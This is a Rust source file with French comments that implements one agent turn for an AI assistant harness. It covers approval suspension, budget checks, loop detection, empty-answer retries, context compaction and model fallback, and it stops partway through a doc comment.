//! Boucle d'agent : un tour, de bout en bout (§3.3, §4.2, §9).
//!
//! Invariants :
//! - tout effet non `readOnly` est **planifié dans le ledger avant** exécution ;
//! - un outil qui exige une approbation suspend **ce tour seulement**, et l'appel reste
//!   dans le transcript : la reprise le retrouve par son identifiant ;
//! - le détecteur de boucles arrête le tour plutôt que de laisser tourner ;
//! - une erreur d'outil est renvoyée au modèle, pas au harnais.
//!
//! Une itération commence **toujours** par résoudre les appels d'outils en attente à la
//! fin du transcript, puis appelle le modèle. Un premier passage et une reprise après
//! approbation suivent donc exactement le même chemin.

use crate::runtime::Services;
use penelope_hitl::{ApprovalKind, ApprovalState, Decision};
use penelope_kernel::effects::{EffectKind, EffectSpec, Planned};
use penelope_kernel::event::EventDraft;
use penelope_kernel::risk::{PolicyDecision, PolicyWindow, RiskClass};
use penelope_llm::provider::{CancelToken, Provider, collect_stream_observed};
use penelope_llm::types::*;
use penelope_tools::{LoopDetector, LoopVerdict, ToolOutcome};
use serde_json::{Value, json};
use std::collections::BTreeSet;
use std::sync::{Arc, Mutex};

/// Issue d'un tour.
#[derive(Debug, Clone, PartialEq)]
pub enum TurnOutcome {
    /// Réponse finale produite.
    Answered {
        text: String,
        iterations: u32,
        cost_usd: f64,
    },
    /// Le tour attend une approbation : il reprendra après décision.
    AwaitingApproval {
        approval_id: String,
    },
    /// Arrêté par le détecteur de boucles (issue #31) : une réponse sans outil qui cite
    /// l'erreur réelle, 2 ou 3 suites à proposer en boutons, et le rapport technique,
    /// gardé pour les événements et les journaux.
    LoopAborted {
        report: String,
        answer: String,
        choices: Vec<String>,
    },
    /// Annulé (bouton stop, `/stop`, annulation du run).
    Cancelled,
    /// Budget épuisé : périmètre (`jour`, `session`, `run`), dépense et plafond.
    BudgetExceeded {
        scope: String,
        spent_usd: f64,
        limit_usd: f64,
    },
    Failed {
        error: String,
    },
}

/// Ce que le tour montre pendant qu'il se déroule.
#[derive(Debug, Clone, PartialEq)]
pub enum TurnEvent {
    /// Fragment de réponse en cours d'écriture.
    Delta(String),
    /// Fragment de raisonnement (affiché seulement si l'interface le demande).
    Reasoning(String),
    ToolCall {
        name: String,
        args: Value,
    },
    ToolResult {
        name: String,
        ok: bool,
        preview: String,
    },
    /// Une approbation est demandée : c'est au canal de la présenter.
    Approval {
        id: String,
        tool: String,
        risk: RiskClass,
        arguments: Value,
        reason: String,
        double: bool,
    },
    /// Le modèle réellement utilisé, après routage et repli éventuel.
    Model {
        model_id: String,
    },
}

/// Destinataire des événements d'un tour. Synchrone : un canal derrière suffit.
pub trait TurnSink: Send + Sync {
    fn emit(&self, event: TurnEvent);
}

/// Sink qui ignore tout.
pub struct NullSink;

impl TurnSink for NullSink {
    fn emit(&self, _event: TurnEvent) {}
}

/// Sink qui garde tout, pour les tests et la collecte.
#[derive(Default)]
pub struct RecordingSink {
    events: Mutex<Vec<TurnEvent>>,
}

impl RecordingSink {
    pub fn events(&self) -> Vec<TurnEvent> {
        self.events
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .clone()
    }
}

impl TurnSink for RecordingSink {
    fn emit(&self, event: TurnEvent) {
        self.events
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .push(event);
    }
}

/// Le transcript sur lequel travaille un tour.
#[async_trait::async_trait]
pub trait Conversation: Send + Sync {
    /// Messages à envoyer au modèle pour la prochaine itération (projection complète,
    /// prompt système compris).
    async fn request_messages(&self) -> anyhow::Result<Vec<ChatMessage>>;
    /// Ajoute un message au transcript.
    async fn record(&self, message: &ChatMessage, eager: bool) -> anyhow::Result<()>;
    /// Queue du transcript, sans prompt système : sert à retrouver les appels en attente.
    async fn tail(&self) -> anyhow::Result<Vec<ChatMessage>>;
    /// Compacte tout de suite après un dépassement de fenêtre prouvé par le provider.
    /// Vrai si des messages ont été résumés : la requête peut être reconstruite.
    async fn compact_for_overflow(&self) -> anyhow::Result<bool> {
        Ok(false)
    }
    /// Applique le budget d'admission (§5.4 niveau 1) aux `count` derniers résultats
    /// d'outils **ensemble** : cinq résultats de 20 k tokens ne passent pas parce
    /// qu'aucun ne dépasse le seuil à lui seul (issue #52).
    async fn admit_tool_results(&self, _count: usize) -> anyhow::Result<()> {
        Ok(())
    }
}

/// Compaction à la demande d'une session (§5.4 : une tentative bornée sur dépassement).
#[async_trait::async_trait]
pub trait Compactor: Send + Sync {
    async fn compact_now(&self, session_id: &str) -> anyhow::Result<bool>;
}

/// Échec d'un appel au modèle, déjà formulé pour l'utilisateur.
pub(crate) struct CallFailure {
    pub message: String,
    /// Le provider a prouvé que la requête dépasse la fenêtre du modèle.
    pub context_length: bool,
}

impl CallFailure {
    fn from_llm(e: &LlmError) -> Self {
        CallFailure {
            message: humanise_llm_error(e),
            context_length: e.kind == LlmErrorKind::ContextLength,
        }
    }

    fn plain(message: impl Into<String>) -> Self {
        CallFailure {
            message: message.into(),
            context_length: false,
        }
    }
}

/// Message d'un plafond atteint : la clé à relever est celle du périmètre atteint, et
/// ce qui ne débloque rien est dit (issue #4).
pub fn budget_exceeded_text(scope: &str, spent_usd: f64, limit_usd: f64) -> String {
    let (label, key) = match scope {
        "session" => ("de la session", "budget.session_usd"),
        "run" => ("du run", "budget.run_usd"),
        _ => ("du jour", "budget.daily_usd"),
    };
    let raised = (limit_usd * 2.0).max(spent_usd + 1.0).ceil();
    let mut out = format!(
        "💸 Budget {label} atteint : {spent_usd:.2} $ dépensés pour un plafond de \
         {limit_usd:.2} $. Tour suspendu.\n\n"
    );
    match scope {
        "session" => out.push_str(&format!(
            "`/new` repart de zéro dans une nouvelle session. Pour continuer celle-ci, relever \
             le plafond : `penelope config set {key} {raised}`."
        )),
        "run" => out.push_str(&format!(
            "Pour laisser le run continuer, relever le plafond : `penelope config set {key} \
             {raised}`."
        )),
        _ => out.push_str(&format!(
            "La dépense du jour repart de zéro à minuit. D'ici là, relever le plafond : \
             `penelope config set {key} {raised}`."
        )),
    }
    out.push_str(
        "\n`/compact` allège le contexte des prochains tours mais ne rembourse pas ce qui est \
         déjà dépensé.",
    );
    out
}

/// Transcript en mémoire : sous-agents, tests, appels ponctuels.
pub struct MemoryConversation {
    system: String,
    messages: Mutex<Vec<ChatMessage>>,
}

impl MemoryConversation {
    pub fn new(system: impl Into<String>, user: impl Into<String>) -> Self {
        MemoryConversation {
            system: system.into(),
            messages: Mutex::new(vec![ChatMessage::user(user.into())]),
        }
    }

    pub fn messages(&self) -> Vec<ChatMessage> {
        self.messages
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .clone()
    }
}

#[async_trait::async_trait]
impl Conversation for MemoryConversation {
    async fn request_messages(&self) -> anyhow::Result<Vec<ChatMessage>> {
        let mut v = vec![ChatMessage::system(self.system.clone())];
        v.extend(self.messages());
        Ok(v)
    }

    async fn record(&self, message: &ChatMessage, _eager: bool) -> anyhow::Result<()> {
        self.messages
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .push(message.clone());
        Ok(())
    }

    async fn tail(&self) -> anyhow::Result<Vec<ChatMessage>> {
        Ok(self.messages())
    }
}

/// Ce qu'il faut savoir d'un appel avant de l'autoriser.
#[derive(Debug, Clone, PartialEq)]
pub struct CallInfo {
    /// Nom sur lequel portent la politique et le ledger : pour `tool_call`, c'est
    /// l'outil MCP visé, pas le méta-outil.
    pub effective_name: String,
    pub risk: RiskClass,
    pub idempotent: bool,
    /// Politique imposée par la déclaration du serveur MCP (`tool_policy`).
    pub policy: Option<PolicyDecision>,
}

/// Exécution concrète d'un outil, fournie par le daemon (ou simulée en test).
#[async_trait::async_trait]
pub trait ToolExecutor {
    async fn execute(
        &self,
        name: &str,
        args: &Value,
    ) -> Result<ToolOutcome, penelope_tools::ToolError>;

    /// Exécute en écoutant l'arrêt demandé : `/stop` pendant un `shell_exec` ou un
    /// sous-agent doit les interrompre, pas attendre leur délai (issue #57).
    async fn execute_cancellable(
        &self,
        name: &str,
        args: &Value,
        cancel: &CancelToken,
    ) -> Result<ToolOutcome, penelope_tools::ToolError> {
        let _ = cancel;
        self.execute(name, args).await
    }

    /// Risque et nom effectif d'un appel. Par défaut : le catalogue natif.
    async fn describe_call(&self, name: &str, args: &Value) -> CallInfo {
        let _ = args;
        CallInfo {
            effective_name: name.to_string(),
            risk: penelope_tools::effective_risk(name, &Default::default()),
            idempotent: penelope_tools::tool_spec(name)
                .map(|s| s.idempotent)
                .unwrap_or(false),
            policy: None,
        }
    }
}

/// Paramètres d'un tour.
#[derive(Clone)]
pub struct TurnSpec {
    pub session_id: String,
    pub run_id: Option<String>,
    /// Tour d'origine, pour attribuer les coûts à la requête du propriétaire.
    pub turn_id: Option<String>,
    pub model_id: String,
    /// Modèles de repli, dans l'ordre, si le principal est en panne (§10.3 point 5).
    pub fallback_models: Vec<String>,
    pub tools: Vec<ToolDef>,
    /// Outils autorisés (liste blanche d'étape ou de skill) ; vide = tous.
    pub allowed_tools: Vec<String>,
    pub cancel: CancelToken,
}

/// Forme historique d'une requête : prompt système et message utilisateur en mémoire.
pub struct TurnRequest {
    pub session_id: String,
    pub run_id: Option<String>,
    pub user_text: String,
    pub model_id: String,
    pub tools: Vec<ToolDef>,
    pub system_prompt: String,
    pub allowed_tools: Vec<String>,
    pub cancel: CancelToken,
}

/// Un exécuteur de tour.
pub struct AgentLoop {
    pub services: Arc<Services>,
    pub provider: Arc<dyn Provider>,
    pub max_iterations: u32,
}

/// Résolution des appels en attente.
enum Pending {
    Nothing,
    Resolved,
    Stop(TurnOutcome),
    /// Boucle arrêtée : le tour répond encore, sans outil.
    Loop {
        report: String,
        tool: String,
        last_result: Option<String>,
    },
}

/// Note laissée dans la conversation quand le détecteur arrête une boucle : le tour suivant
/// voit que l'approche a échoué.
pub const LOOP_STOP_NOTE: &str =
    "[boucle arrêtée par le harnais : cette approche a échoué, ne pas la réessayer telle quelle]";

/// Suites proposées quand le modèle n'en donne pas.
const LOOP_DEFAULT_CHOICES: [&str; 3] = [
    "Chercher autrement",
    "Je te précise (compte, dossier, dates)",
    "Laisser tomber",
];

/// Dernier résultat réel d'un appel identique (même outil, mêmes arguments) dans le
/// transcript, avertissements du harnais exclus.
pub fn last_result_of(tail: &[ChatMessage], tool: &str, args: &Value) -> Option<String> {
    let ids: BTreeSet<&str> = tail
        .iter()
        .filter(|m| m.role == Role::Assistant)
        .flat_map(|m| m.tool_calls.iter())
        .filter(|c| c.name == tool && &c.arguments == args)
        .map(|c| c.id.as_str())
        .collect();
    tail.iter()
        .rev()
        .filter(|m| m.role == Role::Tool)
        .filter(|m| m.tool_call_id.as_deref().is_some_and(|id| ids.contains(id)))
        .map(|m| m.text())
        .find(|t| !t.starts_with("[avertissement du harnais]") && !t.contains(LOOP_STOP_NOTE))
}

/// Sépare la réponse de la ligne `CHOIX : a | b | c` qui la termine.
pub fn split_choices(text: &str) -> (String, Vec<String>) {
    let mut lines: Vec<&str> = text.trim_end().lines().collect();
    let Some(pos) = lines.iter().rposition(|l| {
        l.trim()
            .trim_start_matches(['*', '_', '-', ' '])
            .to_lowercase()
            .starts_with("choix")
    }) else {
        return (text.trim().to_string(), Vec::new());
    };
    let line = lines.remove(pos);
    let choices: Vec<String> = line
        .split_once(':')
        .map(|(_, rest)| rest)
        .unwrap_or_default()
        .split('|')
        .map(|c| {
            c.trim()
                .trim_matches(['*', '_', '`', '«', '»', '"'])
                .trim()
                .to_string()
        })
        .filter(|c| !c.is_empty())
        .map(|c| c.chars().take(60).collect())
        .take(3)
        .collect();
    (lines.join("\n").trim().to_string(), choices)
}

impl AgentLoop {
    pub fn new(services: Arc<Services>, provider: Arc<dyn Provider>) -> Self {
        AgentLoop {
            services,
            provider,
            max_iterations: 24,
        }
    }

    /// Exécute un tour sur un transcript en mémoire.
    pub async fn run(
        &self,
        req: TurnRequest,
        execute: &(dyn ToolExecutor + Send + Sync),
    ) -> anyhow::Result<TurnOutcome> {
        let conv = MemoryConversation::new(req.system_prompt, req.user_text);
        let spec = TurnSpec {
            session_id: req.session_id,
            run_id: req.run_id,
            turn_id: None,
            model_id: req.model_id,
            fallback_models: Vec::new(),
            tools: req.tools,
            allowed_tools: req.allowed_tools,
            cancel: req.cancel,
        };
        self.run_conversation(&spec, &conv, execute, &NullSink)
            .await
    }

    /// Exécute (ou reprend) un tour sur un transcript quelconque.
    pub async fn run_conversation(
        &self,
        spec: &TurnSpec,
        conv: &dyn Conversation,
        execute: &(dyn ToolExecutor + Send + Sync),
        sink: &dyn TurnSink,
    ) -> anyhow::Result<TurnOutcome> {
        let s = &self.services;
        let cfg = s.config.config();
        let mut detector = LoopDetector::new(cfg.tools.loop_detector_repeats);
        let mut cost = 0.0f64;
        // Une réponse vide a droit à une seule relance, puis devient une erreur explicite.
        let mut empty_retry = false;
        // Un dépassement de fenêtre prouvé a droit à une compaction, pas davantage.
        let mut overflow_compacted = false;

        s.events
            .append(
                EventDraft::new("turn.started", json!({"model": spec.model_id}))
                    .session(&spec.session_id),
            )
            .await?;

        for iteration in 0..self.max_iterations {
            if spec.cancel.is_cancelled() {
                return Ok(TurnOutcome::Cancelled);
            }

            // 1. Appels en attente : premier passage ou reprise, même chemin.
            match self
                .resolve_pending(spec, conv, execute, sink, &mut detector)
                .await?
            {
                Pending::Stop(outcome) => return Ok(outcome),
                Pending::Loop {
                    report,
                    tool,
                    last_result,
                } => {
                    return self
                        .answer_after_loop(spec, conv, report, &tool, last_result.as_deref())
                        .await;
                }
                Pending::Nothing | Pending::Resolved => {}
            }
            if spec.cancel.is_cancelled() {
                return Ok(TurnOutcome::Cancelled);
            }

            // 2. Budget : vérifié **avant** chaque appel, pas après coup.
            let statuses = s
                .budget
                .status(&cfg.budget, Some(&spec.session_id), spec.run_id.as_deref())
                .await?;
            if let Some(exceeded) = statuses.iter().find(|b| b.exceeded) {
                let stop = TurnOutcome::BudgetExceeded {
                    scope: exceeded.scope.as_str().to_string(),
                    spent_usd: exceeded.spent_usd,
                    limit_usd: exceeded.limit_usd,
                };
                // Une carte « continuer ? » par plafond atteint (issue #32) : une demande
                // déjà tranchée sans relèvement arrête le tour, une demande en attente est
                // réutilisée plutôt que dupliquée.
                let call_id = format!(
                    "budget:{}:{}",
                    exceeded.scope.as_str(),
                    (exceeded.limit_usd * 100.0).round() as i64
                );
                let approval_id = match s
                    .approvals
                    .find_for_call(&spec.session_id, &call_id)
                    .await?
                {
                    Some(a) if a.state == ApprovalState::Pending => a.id.0.clone(),
                    Some(_) => return Ok(stop),
                    None => {
                        s.approvals
                            .create(
                                ApprovalKind::BudgetExceeded,
                                exceeded.scope.as_str(),
                                RiskClass::Unknown,
                                json!({
                                    "budget": true,
                                    "scope": exceeded.scope.as_str(),
                                    "spent": exceeded.spent_usd,
                                    "limit": exceeded.limit_usd,
                                    "call_id": call_id,
                                    "turn_id": spec.turn_id,
                                    "run_id": spec.run_id,
                                }),
                                vec!["+5 $".into(), "+20 $".into(), "Arrêter".into()],
                                Some(&spec.session_id),
                                spec.run_id.as_deref(),
                                false,
                            )
                            .await?
                            .id
                            .0
                    }
                };
                // Session ouverte par le propriétaire : le tour se suspend et reprend là où
                // il s'est arrêté si le plafond est relevé. Le jour et les runs s'arrêtent.
                let owner_session = exceeded.scope == penelope_kernel::budget::BudgetScope::Session
                    && spec.run_id.is_none()
                    && s.sessions
                        .get(&spec.session_id)
                        .await?
                        .is_some_and(|x| x.kind == penelope_kernel::session::SessionKind::Chat);
                if owner_session {
                    return Ok(TurnOutcome::AwaitingApproval { approval_id });
                }
                return Ok(stop);
            }

            // 2 bis. Tour déjà long, reprises après approbation comprises : plafond d'appels
            // et point de contrôle de coût (issue #19).
            if let Some(stop) = self.turn_limits(spec, sink, iteration, cost).await? {
                return Ok(stop);
            }

            // 3. Appel du modèle, avec repli sur panne transitoire.
            let mut messages = conv.request_messages().await?;
            if empty_retry {
                // Relance vue du modèle seulement : rien n'est écrit dans l'historique.
                messages.push(ChatMessage::user(
                    "(Relance automatique : ta réponse précédente était vide. Réponds \
                     maintenant, en texte, au dernier message.)",
                ));
            }
            // Empreinte et fournisseur amont collant : le cache de préfixe reste chaud et
            // un raté est expliqué (issue #17).
            let previous = crate::cache_audit::previous_call(s, &spec.session_id).await?;
            let pinned = crate::cache_audit::sticky_upstream(
                previous.as_ref(),
                &spec.model_id,
                s.clock.now_ms(),
            );
            let fingerprint = crate::cache_audit::Fingerprint::of(&messages, &spec.tools);
            let response = match self.call_model(spec, messages, sink, pinned, None).await? {
                Ok(r) => r,
                Err(failure) if failure.context_length && !overflow_compacted => {
                    overflow_compacted = true;
                    match conv.compact_for_overflow().await {
                        Ok(true) => {
                            tracing::info!(
                                session = %spec.session_id,
                                "fenêtre dépassée : historique compacté, nouvel essai"
                            );
                            continue;
                        }
                        Ok(false) => {
                            return Ok(TurnOutcome::Failed {
                                error: failure.message,
                            });
                        }
                        Err(e) => {
                            tracing::warn!(
                                session = %spec.session_id,
                                error = %e,
                                "compaction sur dépassement impossible"
                            );
                            return Ok(TurnOutcome::Failed {
                                error: failure.message,
                            });
                        }
                    }
                }
                Err(failure) => {
                    return Ok(TurnOutcome::Failed {
                        error: failure.message,
                    });
                }
            };

            cost += response.cost_usd;
            let miss = crate::cache_audit::miss_cause(
                previous.as_ref(),
                &crate::cache_audit::Observed {
                    fingerprint: &fingerprint,
                    model: &response.model,
                    upstream: response.upstream.as_deref(),
                    prompt: response.usage.prompt,
                    cached: response.usage.cached,
                    now_ms: s.clock.now_ms(),
                },
            );
            s.budget
                .record(penelope_kernel::budget::UsageRecord {
                    msg_count: Some(fingerprint.chain.len() as i64),
                    request_hash: fingerprint.request_hash(),
                    system_hash: Some(fingerprint.system_hash.clone()),
                    tools_hash: Some(fingerprint.tools_hash.clone()),
                    miss_cause: miss.map(String::from),
                    session_id: Some(spec.session_id.clone()),
                    run_id: spec.run_id.clone(),
                    turn_id: spec.turn_id.clone(),
                    model: response.model.clone(),
                    provider: response.provider.clone(),
                    role: Some("chat".into()),
                    generation_id: (!response.id.is_empty()).then(|| response.id.clone()),
                    upstream: response.upstream.clone(),
                    finish: Some(format!("{:?}", response.finish).to_lowercase()),
                    prompt: response.usage.prompt,
                    completion: response.usage.completion,
                    cached: response.usage.cached,
                    cache_write: response.usage.cache_write,
                    reasoning: response.usage.reasoning,
                    cost_usd: response.cost_usd,
                    estimated: response.cost_estimated,
                    ..Default::default()
                })
                .await?;

            if response.finish == FinishReason::Cancelled {
                // Ce qui a été écrit avant l'arrêt reste dans le transcript.
                if !response.message.text().is_empty() {
                    conv.record(&response.message, false).await?;
                }
                return Ok(TurnOutcome::Cancelled);
            }

            let mut response = response;
            // Un refus explicite est une réponse : on la montre telle quelle.
            if response.message.tool_calls.is_empty()
                && response.message.text().trim().is_empty()
                && let Some(refusal) = response.refusal.clone().filter(|r| !r.trim().is_empty())
            {
                response.message.content = vec![penelope_llm::types::Content::text(refusal)];
            }

            // Ni texte ni appel d'outil : on ne livre jamais une réponse vide en silence.
            if response.message.tool_calls.is_empty() && response.message.text().trim().is_empty() {
                // Budget de sortie mangé par le raisonnement : relancer ne changerait rien.
                let reasoning_ate_budget = response.finish == FinishReason::Length
                    && response.usage.reasoning > 0
                    && response
                        .usage
                        .completion
                        .saturating_sub(response.usage.reasoning)
                        <= 2;
                tracing::warn!(
                    session = %spec.session_id,
                    model = %response.model,
                    upstream = ?response.upstream,
                    finish = ?response.finish,
                    native_finish = ?response.native_finish,
                    prompt_tokens = response.usage.prompt,
                    completion_tokens = response.usage.completion,
                    reasoning_tokens = response.usage.reasoning,
                    reasoning_chars = response.reasoning.chars().count(),
                    retried = empty_retry,
                    "réponse vide du modèle"
                );
                s.events
                    .append(
                        EventDraft::new(
                            "turn.empty_answer",
                            json!({
                                "model": response.model,
                                "upstream": response.upstream,
                                "generation_id": response.id,
                                "finish": format!("{:?}", response.finish),
                                "native_finish": response.native_finish,
                                "completion_tokens": response.usage.completion,
                                "reasoning_tokens": response.usage.reasoning,
                                "retried": empty_retry,
                            }),
                        )
                        .session(&spec.session_id),
                    )
                    .await?;
                if !empty_retry && !reasoning_ate_budget {
                    empty_retry = true;
                    continue;
                }
                let upstream = response
                    .upstream
                    .as_deref()
                    .map(|u| format!(" chez {u}"))
                    .unwrap_or_default();
                let cause = if reasoning_ate_budget {
                    format!(
                        "le raisonnement a consommé tout le budget de sortie ({} tokens sur {})",
                        response.usage.reasoning, response.usage.completion
                    )
                } else {
                    format!(
                        "aucun texte, deux fois (fin : {:?}{} ; {} tokens produits dont {} de \
                         raisonnement)",
                        response.finish,
                        response
                            .native_finish
                            .as_deref()
                            .map(|n| format!(", amont : {n}"))
                            .unwrap_or_default(),
                        response.usage.completion,
                        response.usage.reasoning
                    )
                };
                return Ok(TurnOutcome::Failed {
                    error: format!(
                        "le modèle `{}`{upstream} n'a pas répondu : {cause}. Essayer un autre \
                         modèle (`/model main openrouter:<identifiant>`) ; `/models` montre le \
                         routage en vigueur",
                        response.model
                    ),
                });
            }

            conv.record(&response.message, false).await?;

            // 4. Pas d'appel d'outil : c'est la réponse finale.
            if response.message.tool_calls.is_empty() {
                let mut text = response.message.text();
                // Un tour coûteux le dit, sans que la mention entre dans l'historique.
                if let Some(turn_id) = &spec.turn_id
                    && cfg.budget.show_turn_cost_usd > 0.0
                {
                    let (calls, turn_cost) = s.budget.turn_totals(turn_id).await?;
                    if turn_cost >= cfg.budget.show_turn_cost_usd {
                        text.push_str(&format!(
                            "\n\n_Coût de ce tour : {} ({calls} appels au modèle)._",
                            crate::budget_alert::usd(turn_cost)
                        ));
                    }
                }
                s.events
                    .append(
                        EventDraft::new(
                            "turn.finished",
                            json!({"iterations": iteration + 1, "cost_usd": cost}),
                        )
                        .session(&spec.session_id),
                    )
                    .await?;
                return Ok(TurnOutcome::Answered {
                    text,
                    iterations: iteration + 1,
                    cost_usd: cost,
                });
            }
            // Sinon, l'itération suivante résout les appels qui viennent d'être écrits.
        }

        Ok(TurnOutcome::Failed {
            error: format!(
                "le tour n'a pas convergé en {} itérations",
                self.max_iterations
            ),
        })
    }

    /// Appelle le modèle en diffusant les fragments ; essaie les replis sur panne.
    ///
    /// Chez OpenRouter, les replis partent dans la requête (`models`) : OpenRouter bascule
    /// lui-même avant le premier jeton, y compris quand la panne survient après le 200.
    /// Ailleurs, ils sont essayés ici, sur les erreurs d'avant flux.
    async fn call_model(
        &self,
        spec: &TurnSpec,
        messages: Vec<ChatMessage>,
        sink: &dyn TurnSink,
        pinned_upstream: Option<String>,
        tool_choice: Option<ToolChoice>,
    ) -> anyhow::Result<Result<ChatResponse, CallFailure>> {
        let s = &self.services;
        let server_side_fallback = self.provider.name() == "openrouter";
        let mut candidates = vec![spec.model_id.clone()];
        if !server_side_fallback {
            candidates.extend(
                spec.fallback_models
                    .iter()
                    .filter(|m| **m != spec.model_id)
                    .cloned(),
            );
        }
        let mut last_error = CallFailure::plain("aucun modèle n'a répondu");
        // Erreur d'avant flux : quelques nouvelles tentatives, attente doublée à chaque
        // fois, avant de changer de modèle (issue #50).
        let max_retries = s.config.config().providers.openrouter.request_retries;
        let mut retries: u32 = 0;
        let mut waited_secs: u64 = 0;
        // Erreur en cours de flux avant tout texte : un nouvel essai, puis les replis
        // (côté client, même avec OpenRouter dont le repli ne joue qu'avant le flux).
        let mut stream_retried = false;
        let mut client_fallbacks = !server_side_fallback;

        let mut attempt = 0;
        while attempt < candidates.len() {
            let model_id = candidates[attempt].clone();
            let request = ChatRequest {
                model: model_id.clone(),
                messages: fit_modalities(&messages, &s.catalog, &model_id),
                tools: spec.tools.clone(),
                tool_choice: match (&tool_choice, spec.tools.is_empty()) {
                    (_, true) => None,
                    (Some(forced), false) => Some(*forced),
                    (None, false) => Some(ToolChoice::Auto),
                },
                stream: true,
                session_id: Some(spec.session_id.clone()),
                fallback_models: if server_side_fallback {
                    spec.fallback_models.clone()
                } else {
                    Vec::new()
                },
                // Collant pour le modèle principal seulement : un repli change de fournisseur.
                pinned_upstream: (attempt == 0).then(|| pinned_upstream.clone()).flatten(),
                ..Default::default()
            };

            // Machine d'état des appels LLM (§4.3).
            let llm_id = format!("q_{}", penelope_kernel::ids::Ulid::new());
            let body = serde_json::to_value(&request).unwrap_or(Value::Null);
            s.llm_state
                .plan(
                    &llm_id,
                    Some(&spec.session_id),
                    spec.run_id.as_deref(),
                    &model_id,
                    self.provider.name(),
                    &body,
                )
                .await?;
            s.llm_state.dispatching(&llm_id).await?;

            let stream = match self
                .provider
                .chat_stream(request, spec.cancel.clone())
                .await
            {
                Ok(st) => st,
                Err(e) => {
                    s.llm_state
                        .failed(&llm_id, &e.to_string(), e.maybe_billed)
                        .await?;
                    last_error = CallFailure::from_llm(&e);
                    let retryable = penelope_llm::Router::should_fallback(&e);
                    // Incident passager (5xx, délai de connexion, limite de débit) : on
                    // rappelle le même modèle après 1 s, 2 s, 4 s, ou après le
                    // `Retry-After` s'il est court. Un incident de deux secondes ne fait
                    // plus échouer le tour (issue #50).
                    // Tant qu'un autre modèle reste à essayer, une seule attente : le
                    // repli coûte moins cher qu'une attente de plus. Sur le dernier
                    // candidat, tout le budget de tentatives sert.
                    let others_left = attempt + 1 < candidates.len()
                        || (!client_fallbacks
                            && spec.fallback_models.iter().any(|m| !candidates.contains(m)));
                    let budget = if others_left {
                        max_retries.min(1)
                    } else {
                        max_retries
                    };
                    if retryable && retries < budget && !spec.cancel.is_cancelled() {
                        let secs = e
                            .retry_after
                            .filter(|s| *s <= RETRY_AFTER_MAX_SECS)
                            .unwrap_or_else(|| retry_backoff_secs(retries));
                        retries += 1;
                        waited_secs += secs;
                        tracing::warn!(
                            model = %model_id, error = %e, secs, attempt = retries,
                            "erreur avant le flux : nouvel essai"
                        );
                        s.events
                            .append(
                                EventDraft::new(
                                    "llm.retried",
                                    json!({
                                        "model": model_id,
                                        "attempt": retries,
                                        "wait_s": secs,
                                        "error": e.to_string(),
                                    }),
                                )
                                .session(&spec.session_id),
                            )
                            .await?;
                        if !sleep_unless_cancelled(&spec.cancel, secs).await {
                            return Ok(Err(CallFailure::plain("arrêt demandé")));
                        }
                        continue;
                    }
                    // Le fournisseur lui-même est injoignable : son repli côté serveur ne
                    // joue pas, on prend la main avec les replis d'alias.
                    if retryable && !client_fallbacks {
                        client_fallbacks = true;
                        for m in &spec.fallback_models {
                            if !candidates.contains(m) {
                                candidates.push(m.clone());
                            }
                        }
                    }
                    let more = attempt + 1 < candidates.len();
                    if more && retryable {
                        tracing::warn!(model = %model_id, error = %e, "repli sur le modèle suivant");
                        retries = 0;
                        attempt += 1;
                        continue;
                    }
                    return Ok(Err(with_attempts(last_error, retries, waited_secs)));
                }
            };
            s.llm_state.response_started(&llm_id).await?;
            sink.emit(TurnEvent::Model {
                model_id: model_id.clone(),
            });

            // Ce qui est déjà parti vers l'utilisateur : texte de réponse ou appel d'outil.
            let shown = std::sync::atomic::AtomicBool::new(false);
            let observe = |chunk: &StreamChunk| match chunk {
                StreamChunk::Delta { text } => {
                    if !text.is_empty() {
                        shown.store(true, std::sync::atomic::Ordering::SeqCst);
                    }
                    sink.emit(TurnEvent::Delta(text.clone()))
                }
                StreamChunk::Reasoning { text } => sink.emit(TurnEvent::Reasoning(text.clone())),
                StreamChunk::ToolCall(_) => shown.store(true, std::sync::atomic::Ordering::SeqCst),
                _ => {}
            };
            match collect_stream_observed(
                stream,
                &model_id,
                self.provider.name(),
                &s.catalog,
                &observe,
            )
            .await
            {
                Ok(r) => {
                    s.llm_state.completed(&llm_id).await?;
                    let requested = penelope_llm::catalog::strip_provider(&model_id);
                    if !r.model.is_empty() && r.model != requested {
                        // Repli fait par OpenRouter : on le dit, rien n'est silencieux.
                        tracing::warn!(
                            session = %spec.session_id,
                            requested = %requested,
                            served = %r.model,
                            "réponse servie par un modèle de repli"
                        );
                        s.events
                            .append(
                                EventDraft::new(
                                    "llm.fallback_used",
                                    json!({"requested": requested, "served": r.model}),
                                )
                                .session(&spec.session_id),
                            )
                            .await?;
                        sink.emit(TurnEvent::Model {
                            model_id: r.model.clone(),
                        });
                    }
                    return Ok(Ok(r));
                }
                Err(e) => {
                    s.llm_state
                        .failed(&llm_id, &e.to_string(), e.maybe_billed)
                        .await?;
                    let shown = shown.load(std::sync::atomic::Ordering::SeqCst);
                    if shown {
                        // Des fragments sont déjà partis : pas de repli silencieux, on le dit.
                        let mut failure = CallFailure::from_llm(&e);
                        failure.message = format!(
                            "{}\n\nLa réponse a été coupée en cours d'écriture : le début \
                             affiché est incomplet.",
                            failure.message
                        );
                        return Ok(Err(failure));
                    }
                    last_error = CallFailure::from_llm(&e);
                    if !penelope_llm::Router::should_fallback(&e) || spec.cancel.is_cancelled() {
                        return Ok(Err(last_error));
                    }
                    if !stream_retried {
                        stream_retried = true;
                        let secs = e
                            .retry_after
                            .filter(|s| *s <= RETRY_AFTER_MAX_SECS)
                            .unwrap_or(STREAM_RETRY_SECS);
                        tracing::warn!(
                            model = %model_id,
                            error = %e,
                            secs,
                            "flux interrompu avant tout texte : nouvel essai"
                        );
                        if !sleep_unless_cancelled(&spec.cancel, secs).await {
                            return Ok(Err(CallFailure::plain("arrêt demandé")));
                        }
                        continue;
                    }
                    if !client_fallbacks {
                        client_fallbacks = true;
                        for m in &spec.fallback_models {
                            if !candidates.contains(m) {
                                candidates.push(m.clone());
                            }
                        }
                    }
                    if attempt + 1 < candidates.len() {
                        tracing::warn!(
                            model = %model_id,
                            error = %e,
                            "flux interrompu avant tout texte : repli sur le modèle suivant"
                        );
                        attempt += 1;
                        continue;
                    }
                    return Ok(Err(last_error));
                }
            }
        }
        Ok(Err(last_error))
    }

    /// Réponse après une boucle arrêtée (issue #31) : un appel sans outil explique ce qui a
    /// été tenté et l'erreur exacte, et propose des suites ; à défaut, un repli lisible qui
